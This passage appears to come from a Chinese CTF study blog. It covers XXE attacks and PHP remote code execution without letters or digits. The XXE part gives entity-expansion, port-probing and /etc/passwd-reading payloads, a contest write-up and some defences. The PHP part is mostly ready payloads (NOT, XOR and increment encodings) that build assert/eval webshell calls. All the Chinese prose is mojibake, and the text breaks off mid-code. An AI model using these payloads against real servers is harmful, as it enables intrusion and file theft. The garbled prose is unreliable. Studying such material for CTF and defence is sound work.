attr-name">"&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;"</span><span class="token punctuation">></span></span></span><span class="token punctuation">]</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>lolz</span><span class="token punctuation">></span></span><span class="token entity named-entity" title="&lol9;">&amp;lol9;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>lolz</span><span class="token punctuation">></span></span></code></pre><p><strong>åŸç†</strong>ï¼šé€’å½’å¼•ç”¨,lol å®ä½“å…·ä½“è¿˜æœ‰ â€œlolâ€ å­—ç¬¦ä¸²ï¼Œç„¶åä¸€ä¸ª lol2 å®ä½“å¼•ç”¨äº† 10 æ¬¡ lol å®ä½“ï¼Œä¸€ä¸ª lol3 å®ä½“å¼•ç”¨äº† 10 æ¬¡ lol2 å®ä½“ï¼Œæ­¤æ—¶ä¸€ä¸ª lol3 å®ä½“å°±å«æœ‰ 10^2 ä¸ª â€œlolâ€ äº†ï¼Œä»¥æ­¤ç±»æ¨ï¼Œlol9 å®ä½“å«æœ‰ 10^8 ä¸ª â€œlolâ€ å­—ç¬¦ä¸²,æœ€åå†å¼•ç”¨lol9ã€‚</p><h4 id="æ¢æµ‹å†…ç½‘ç«¯å£"><a href="#æ¢æµ‹å†…ç½‘ç«¯å£" class="headerlink" title="æ¢æµ‹å†…ç½‘ç«¯å£"></a>æ¢æµ‹å†…ç½‘ç«¯å£</h4><pre class="language-xml" data-language="xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0" encoding="utf-8"?></span><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">xxe</span> <span class="token punctuation">[</span><span class="token internal-subset"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ELEMENT</span> <span class="token attr-name">name</span> <span class="token attr-name">ANY</span> <span class="token punctuation">></span></span>&lt;!ENTITY xxe SYSTEM "http://127.0.0.1:80" ></span><span class="token punctuation">]</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>root</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">></span></span><span class="token entity named-entity" title="&xxe;">&amp;xxe;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>root</span><span class="token punctuation">></span></span></code></pre><h3 id="æ¼æ´é˜²å¾¡"><a href="#æ¼æ´é˜²å¾¡" class="headerlink" title="æ¼æ´é˜²å¾¡"></a>æ¼æ´é˜²å¾¡</h3><p><strong>ä½¿ç”¨å¼€å‘è¯­è¨€æä¾›çš„ç¦ç”¨å¤–éƒ¨å®ä½“çš„æ–¹æ³•</strong></p><p>php:</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token function">libxml_disable_entity_loader</span><span class="token punctuation">(</span><span class="token constant boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>java:</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">DocumentBuilderFactory</span> dbf <span class="token operator">=</span><span class="token class-name">DocumentBuilderFactory</span><span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>dbf<span class="token punctuation">.</span><span class="token function">setExpandEntityReferences</span><span class="token punctuation">(</span><span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>Python:</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> lxml <span class="token keyword">import</span> etreexmlData <span class="token operator">=</span> etree<span class="token punctuation">.</span>parse<span class="token punctuation">(</span>xmlSource<span class="token punctuation">,</span>etree<span class="token punctuation">.</span>XMLParser<span class="token punctuation">(</span>resolve_entities<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><p><strong>è¿‡æ»¤ç”¨æˆ·æäº¤çš„XMLæ•°æ®</strong></p><p>è¿‡æ»¤å…³é”®å­—ï¼š<code>&lt;\!DOCTYPE</code>å’Œ<code>&lt;\!ENTITY</code>ï¼Œæˆ–è€…<code>SYSTEM</code>å’Œ<code>PUBLIC</code>ã€‚</p><p><strong>ä¸å…è®¸XMLä¸­å«æœ‰è‡ªå·±å®šä¹‰çš„DTD</strong></p><h3 id="æ —å­"><a href="#æ —å­" class="headerlink" title="æ —å­"></a>æ —å­</h3><h4 id="NCTF2019-True-XML-cookbook"><a href="#NCTF2019-True-XML-cookbook" class="headerlink" title="[NCTF2019]True XML cookbook"></a>[NCTF2019]True XML cookbook</h4><p>ç•Œé¢ï¼š</p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/XXEå­¦ä¹ ç¬”è®°/image-20200817204320669.png" style="zoom:80%;" loading="lazy"><p>é¢˜ç›®æç¤º<code>xml</code>ï¼Œæ¨æµ‹æ˜¯<code>xxe</code>ï¼Œäºæ˜¯<code>login</code>æŠ“åŒ…ï¼Œå‘ç°æäº¤<code>username</code>å’Œ<code>password</code>æ˜¯ä»¥ä¸€ä¸ª<code>xml</code>æ ¼å¼çš„æ•°æ®æäº¤çš„ï¼Œå¦‚ä¸‹ï¼š</p><pre class="language-xml" data-language="xml"><code class="language-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>user</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>username</span><span class="token punctuation">></span></span>admin<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>username</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>password</span><span class="token punctuation">></span></span>123456<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>password</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>user</span><span class="token punctuation">></span></span></code></pre><p>äºæ˜¯è¿›è¡Œ<code>xxe</code>æ³¨å…¥æµ‹è¯•ï¼š</p><pre class="language-xml" data-language="xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0" encoding="utf-8"?></span><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">xxe</span> <span class="token punctuation">[</span><span class="token internal-subset"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ELEMENT</span> <span class="token attr-name">name</span> <span class="token attr-name">ANY</span> <span class="token punctuation">></span></span>&lt;!ENTITY file SYSTEM "file:///etc/passwd" ></span><span class="token punctuation">]</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>user</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>username</span><span class="token punctuation">></span></span><span class="token entity named-entity" title="&file;">&amp;file;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>username</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>password</span><span class="token punctuation">></span></span>aaa<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>password</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>user</span><span class="token punctuation">></span></span></code></pre><p>å›æ˜¾<code>/etc/passwd</code>çš„å†…å®¹ï¼Œå­˜åœ¨<code>xxe</code>æ³¨å…¥ï¼Œå°è¯•è¯»å–æ–‡ä»¶ï¼Œå¾—åˆ°<code>doLogin.php</code>çš„ä»£ç </p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">/*** autor: c0ny1* date: 2018-2-7*/</span><span class="token variable">$USERNAME</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'admin'</span><span class="token punctuation">;</span> <span class="token comment">//è´¦å·</span><span class="token variable">$PASSWORD</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'024b87931a03f738fff6693ce0a78c88'</span><span class="token punctuation">;</span> <span class="token comment">//å¯†ç </span><span class="token variable">$result</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">;</span><span class="token function">libxml_disable_entity_loader</span><span class="token punctuation">(</span><span class="token constant boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$xmlfile</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'php://input'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">try</span><span class="token punctuation">&#123;</span><span class="token variable">$dom</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">DOMDocument</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$dom</span><span class="token operator">-></span><span class="token function">loadXML</span><span class="token punctuation">(</span><span class="token variable">$xmlfile</span><span class="token punctuation">,</span> <span class="token class-name">LIBXML_NOENT</span> <span class="token operator">|</span> <span class="token class-name">LIBXML_DTDLOAD</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$creds</span> <span class="token operator">=</span> <span class="token function">simplexml_import_dom</span><span class="token punctuation">(</span><span class="token variable">$dom</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$username</span> <span class="token operator">=</span> <span class="token variable">$creds</span><span class="token operator">-></span><span class="token property">username</span><span class="token punctuation">;</span><span class="token variable">$password</span> <span class="token operator">=</span> <span class="token variable">$creds</span><span class="token operator">-></span><span class="token property">password</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$username</span> <span class="token operator">==</span> <span class="token variable">$USERNAME</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$password</span> <span class="token operator">==</span> <span class="token variable">$PASSWORD</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">sprintf</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"&lt;result>&lt;code>%d&lt;/code>&lt;msg>%s&lt;/msg>&lt;/result>"</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token variable">$username</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span><span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">sprintf</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"&lt;result>&lt;code>%d&lt;/code>&lt;msg>%s&lt;/msg>&lt;/result>"</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token variable">$username</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">catch</span><span class="token punctuation">(</span><span class="token class-name">Exception</span> <span class="token variable">$e</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">sprintf</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"&lt;result>&lt;code>%d&lt;/code>&lt;msg>%s&lt;/msg>&lt;/result>"</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token variable">$e</span><span class="token operator">-></span><span class="token function">getMessage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">header</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Content-Type: text/html; charset=utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$result</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></code></pre><p>æµ‹è¯•è¯»å–<code>flag</code>ï¼Œç¡¬æ˜¯æ²¡æ‰¾åˆ°ï¼Œæ— æ³•å‘½ä»¤æ‰§è¡Œï¼Œç½‘ä¸Šæ‰¾äº†æ‰¾<code>wp</code>ï¼Œæ”¾å¿ƒå±…ç„¶æ˜¯å†…ç½‘æ¢æµ‹ï¼Œè¯»å–<code>/etc/hosts</code>çš„æ–‡ä»¶ï¼Œè¯»åˆ°æœ¬æœº<code>ip</code>åœ°å€<code>173.56.110.9</code>ï¼Œäºæ˜¯æ¢æµ‹å­ç½‘ï¼š</p><pre class="language-xml" data-language="xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0" encoding="utf-8"?></span><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">xxe</span> <span class="token punctuation">[</span><span class="token internal-subset"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ELEMENT</span> <span class="token attr-name">name</span> <span class="token attr-name">ANY</span> <span class="token punctuation">></span></span>&lt;!ENTITY file SYSTEM "http://173.56.110.11" ></span><span class="token punctuation">]</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>user</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>username</span><span class="token punctuation">></span></span><span class="token entity named-entity" title="&file;">&amp;file;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>username</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>password</span><span class="token punctuation">></span></span>aaa<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>password</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>user</span><span class="token punctuation">></span></span></code></pre><p><code>173.56.110.11</code>ï¼Œè¿”å›flag</p><h3 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h3><ul><li><a href="https://xz.aliyun.com/t/6887">ä»XMLç›¸å…³ä¸€æ­¥ä¸€æ­¥åˆ°XXEæ¼æ´</a></li><li><a href="https://www.freebuf.com/column/211251.html">xPathæ³¨å…¥å­¦ä¹ ä¹‹åŸºç¡€è¯­æ³•å­¦ä¹ </a></li><li><a href="https://blog.blankshell.com/2020/06/09/xxe%e8%af%a6%e7%bb%86%e6%80%bb%e7%bb%93/">XXEçŸ¥è¯†æ€»ç»“</a></li><li><a href="http://www.suk1.top/2020/03/18/XXElearn/">XXEæ¼æ´å­¦ä¹ </a></li></ul>]]></content>
      
      
      <categories>
          
          <category> å¤‡å¿˜å½• </category>
          
      </categories>
      
      
        <tags>
            
            <tag> xml </tag>
            
            <tag> xxe </tag>
            
            <tag> xpath </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHPæ— å­—æ¯æ•°å­—RCE</title>
      <link href="posts/a268445b/"/>
      <url>posts/a268445b/</url>
      
        <content type="html"><![CDATA[<p>CTFæœ‰æ—¶ä¼šç¢°åˆ°è¿™ç§ç±»å‹é¢˜ï¼Œæ•…åœ¨è¿™é‡Œæ€»ç»“ä¸€ä¸‹ï¼Œæ—¥åæœ‰æ–°çš„æ“ä½œå†è¡¥ä¸Š</p><p><strong>åˆ©ç”¨æ¡ä»¶</strong>ï¼š<code>eval($_GET[&#39;exp&#39;]);</code></p><p><strong>é™åˆ¶æ¡ä»¶</strong>ï¼š<code>preg_match(&#39;[a-z0-9]/is&#39;, $exp)</code></p><span id="more"></span><p>æµ‹è¯•ä»£ç å¦‚ä¸‹ï¼š</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[a-z0-9]/is'</span><span class="token punctuation">,</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'exp'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'exp'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span></code></pre><h3 id="å–å"><a href="#å–å" class="headerlink" title="å–å"></a>å–å</h3><p>phpç‰ˆæœ¬ï¼šPHP Version 7.2.24-0</p><p>exp</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token operator">~</span><span class="token string single-quoted-string">'exp'</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>payload</p><pre class="language-PHP" data-language="PHP"><code class="language-PHP">echo urlencode(~&#39;phpinfo&#39;); (~%8F%97%8F%96%91%99%90)();  &#x3D;&#x3D;&gt;  phpinfo();echo urlencode(~&#39;assert&#39;);echo urlencode(~&#39;(eval($_POST[&quot;a&quot;]))&#39;);(~%9E%8C%8C%9A%8D%8B)(~%D7%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%DD%9E%DD%A2%D6%D6);  &#x3D;&#x3D;&gt;  assert(&#39;eval($_POST[&quot;a&quot;])&#39;)</code></pre><p>æµ‹è¯•ç»“æœå¦‚ä¸‹</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/PHP%E6%97%A0%E5%AD%97%E6%AF%8D%E6%95%B0%E5%AD%97RCE/image-20200809124140760.png" alt loading="lazy"></p><h3 id="å¼‚æˆ–"><a href="#å¼‚æˆ–" class="headerlink" title="å¼‚æˆ–"></a>å¼‚æˆ–</h3><p>phpç‰ˆæœ¬ï¼šPHP Version 7.2.24-0</p><p>exp</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token comment">// è·‘å‡ºéå­—æ¯æ•°å­—å¼‚æˆ–å¾—åˆ°çš„ $str</span><span class="token variable">$str</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'GET'</span><span class="token punctuation">;</span><span class="token variable">$exp1</span> <span class="token operator">=</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">;</span><span class="token variable">$exp2</span> <span class="token operator">=</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$k</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$k</span> <span class="token operator">&lt;</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token variable">$k</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$flag</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token number">128</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">>=</span> <span class="token number">48</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$i</span> <span class="token operator">&lt;=</span> <span class="token number">57</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">>=</span> <span class="token number">65</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$i</span> <span class="token operator">&lt;=</span> <span class="token number">90</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">>=</span> <span class="token number">97</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$i</span> <span class="token operator">&lt;=</span> <span class="token number">122</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">continue</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$j</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$j</span> <span class="token operator">&lt;</span> <span class="token number">128</span><span class="token punctuation">;</span> <span class="token variable">$j</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$j</span> <span class="token operator">>=</span> <span class="token number">48</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$j</span> <span class="token operator">&lt;=</span> <span class="token number">57</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token punctuation">(</span><span class="token variable">$j</span> <span class="token operator">>=</span> <span class="token number">65</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$j</span> <span class="token operator">&lt;=</span> <span class="token number">90</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token punctuation">(</span><span class="token variable">$j</span> <span class="token operator">>=</span> <span class="token number">97</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$j</span> <span class="token operator">&lt;=</span> <span class="token number">122</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token keyword">continue</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token variable">$j</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token variable">$str</span><span class="token punctuation">[</span><span class="token variable">$k</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token variable">$exp1</span> <span class="token operator">=</span> <span class="token variable">$exp1</span><span class="token operator">.</span><span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token variable">$exp2</span> <span class="token operator">=</span> <span class="token variable">$exp2</span><span class="token operator">.</span><span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token variable">$j</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token variable">$flag</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>                <span class="token keyword">break</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$flag</span> <span class="token operator">===</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">echo</span> <span class="token variable">$exp1</span><span class="token operator">.</span><span class="token string single-quoted-string">'^'</span><span class="token operator">.</span><span class="token variable">$exp2</span><span class="token operator">.</span><span class="token string double-quoted-string">"\n"</span><span class="token punctuation">;</span></code></pre><p>payload</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token variable">$</span><span class="token punctuation">&#123;</span><span class="token operator">%</span>ff<span class="token operator">%</span>ff<span class="token operator">%</span>ff<span class="token operator">%</span>ff<span class="token operator">^</span><span class="token operator">%</span>a0<span class="token operator">%</span>b8<span class="token operator">%</span>ba<span class="token operator">%</span>ab<span class="token punctuation">&#125;</span><span class="token punctuation">&#123;</span><span class="token operator">%</span>ff<span class="token punctuation">&#125;</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">&amp;</span><span class="token operator">%</span>ff<span class="token operator">=</span>phpinfo<span class="token operator">==</span><span class="token operator">></span>  <span class="token function">phpinfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token variable">$</span><span class="token punctuation">&#123;</span><span class="token operator">%</span>fe<span class="token operator">%</span>fe<span class="token operator">%</span>fe<span class="token operator">%</span>fe<span class="token operator">^</span><span class="token operator">%</span>a1<span class="token operator">%</span>b9<span class="token operator">%</span>bb<span class="token operator">%</span>aa<span class="token punctuation">&#125;</span><span class="token punctuation">[</span><span class="token constant">_</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token variable">$</span><span class="token punctuation">&#123;</span><span class="token operator">%</span>fe<span class="token operator">%</span>fe<span class="token operator">%</span>fe<span class="token operator">%</span>fe<span class="token operator">^</span><span class="token operator">%</span>a1<span class="token operator">%</span>b9<span class="token operator">%</span>bb<span class="token operator">%</span>aa<span class="token punctuation">&#125;</span><span class="token punctuation">[</span><span class="token constant">__</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">&amp;</span><span class="token constant">_</span><span class="token operator">=</span>assert<span class="token operator">&amp;</span><span class="token constant">__</span><span class="token operator">=</span><span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token operator">%</span><span class="token number">27</span>a<span class="token operator">%</span><span class="token number">27</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token operator">></span>  <span class="token function">assert</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"eval(<span class="token interpolation"><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'a'</span><span class="token punctuation">]</span></span>)"</span><span class="token punctuation">)</span></code></pre><p>æµ‹è¯•ç»“æœå¦‚ä¸‹</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/PHP%E6%97%A0%E5%AD%97%E6%AF%8D%E6%95%B0%E5%AD%97RCE/image-20200809124757860.png" alt loading="lazy"></p><p>ç±»ä¼¼çš„</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$_</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"!((%)("</span><span class="token operator">^</span><span class="token string double-quoted-string">"@[[@[\\"</span><span class="token punctuation">;</span>   <span class="token comment">//æ„é€ å‡ºassert</span><span class="token variable">$__</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"!+/(("</span><span class="token operator">^</span><span class="token string double-quoted-string">"~&#123;`&#123;|"</span><span class="token punctuation">;</span>   <span class="token comment">//æ„é€ å‡º_POST</span><span class="token variable">$___</span> <span class="token operator">=</span> <span class="token variable">$$__</span><span class="token punctuation">;</span>   <span class="token comment">//$___ = $_POST</span><span class="token variable">$_</span><span class="token punctuation">(</span><span class="token variable">$___</span><span class="token punctuation">[</span><span class="token constant">_</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">//assert($_POST[_]);</span></span></code></pre><h3 id="è‡ªå¢"><a href="#è‡ªå¢" class="headerlink" title="è‡ªå¢"></a>è‡ªå¢</h3><p>payload</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$_</span><span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">//ä¿©æ•°ç»„æ‹¼æ¥å¼ºè¡Œè¿”å›ArrayArray,è¿™é‡Œä¸€ä¸ªçŸ­æ çš„å€¼ä¹Ÿå°±æ˜¯ArrayArray</span><span class="token variable">$__</span><span class="token operator">=</span><span class="token string single-quoted-string">''</span><span class="token punctuation">;</span>  <span class="token comment">//ä¸¤ä¸ªçŸ­æ èµ‹å€¼ä¸ºç©º</span><span class="token variable">$_</span><span class="token operator">=</span><span class="token variable">$_</span><span class="token punctuation">[</span><span class="token string single-quoted-string">''</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment">//ä»arrayarrayä¸­å–é¦–å­—ç¬¦ï¼Œå³aã€‚è¿™é‡Œ$_=$_[0]ä¹Ÿæ˜¯ä¸€æ ·çš„é“ç†ï¼Œä¸è¿‡wafé™åˆ¶æ•°å­—è¾“å…¥</span><span class="token variable">$_</span><span class="token operator">=</span><span class="token operator">++</span><span class="token variable">$_</span><span class="token punctuation">;</span> <span class="token comment">//b</span><span class="token variable">$_</span><span class="token operator">=</span><span class="token operator">++</span><span class="token variable">$_</span><span class="token punctuation">;</span> <span class="token comment">//c</span><span class="token variable">$_</span><span class="token operator">=</span><span class="token operator">++</span><span class="token variable">$_</span><span class="token punctuation">;</span> <span class="token comment">//d</span><span class="token variable">$_</span><span class="token operator">=</span><span class="token operator">++</span><span class="token variable">$_</span><span class="token punctuation">;</span> <span class="token comment">//e</span><span class="token variable">$__</span><span class="token operator">.=</span><span class="token variable">$_</span><span class="token punctuation">;</span> <span class="token comment">//E  æŠŠä¸¤ä¸ªçŸ­æ èµ‹å€¼ä¸ºE</span><span class="token variable">$_</span><span class="token operator">=</span><span class="token operator">++</span><span class="token variable">$_</span><span class="token punctuation">;</span> <span class="token comment">//F  ä¸€ä¸ªçŸ­æ ç»§ç»­è‡ªå¢</span><span class="token variable">$_</span><span class="token operator">=</span><span class="token operator">++</span><span class="token variable">$_</span><span class="token punctuation">;</span> <span class="token comment">//G </span><span class="token variable">$__</span><span class="token operator">=</span><span class="token variable">$_</span><span class="token operator">.</span><span class="token variable">$__</span><span class="token punctuation">;</span> <span class="token comment">// 